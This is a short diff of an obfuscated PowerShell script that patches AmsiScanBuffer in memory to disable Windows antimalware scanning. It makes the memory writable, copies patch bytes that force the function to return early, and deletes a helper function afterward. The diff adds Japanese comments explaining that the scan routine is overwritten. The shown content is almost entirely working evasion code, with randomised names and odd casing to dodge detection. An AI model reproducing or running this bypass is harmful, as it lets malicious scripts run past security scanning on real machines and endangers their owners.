@@ -208,6 +208,8 @@ $UQXThoSh2exMyo = $knBIRuLz.Invoke($jdemwXeK2wnWhB, 3, 0x40, [ref]$N7IBEcG01XRRl
 #jump
 $hpBlHjUMs = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
 #jump
+# System.Runtime.InteropServices.Marshal.Copy()メソッドを使用して、マネージド配列のデータをアンマネージド メモリ ポインター(AmsiScanBuffer)にコピーする
+# 要するに、AmsiScanBufferのプロセスが上書きされる
 $UQXThoSh2exMyo = [SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::Copy($hpBlHjUMs, 0, $jdemwXeK2wnWhB, 12)
 #jump
 Remove-Item Function:Get-iy2kysa7yS
